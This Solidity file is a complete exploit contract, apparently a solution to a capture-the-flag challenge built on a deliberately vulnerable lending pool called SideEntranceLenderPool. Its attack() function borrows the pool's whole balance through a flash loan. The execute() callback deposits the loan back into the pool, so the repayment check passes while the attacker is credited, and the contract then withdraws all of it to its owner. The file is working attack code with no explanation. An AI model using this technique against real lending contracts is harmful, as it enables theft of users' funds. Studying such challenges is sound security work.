// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract Attack {
    SideEntranceLenderPool private pool;
    address payable owner;

    constructor(address _poolAddress) {
        pool = SideEntranceLenderPool(_poolAddress);
        owner = payable(msg.sender);
    }

    function attack() public {
        uint256 amount = address(pool).balance;
        pool.flashLoan(amount);
        pool.withdraw();
        owner.call{value: amount}("");
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
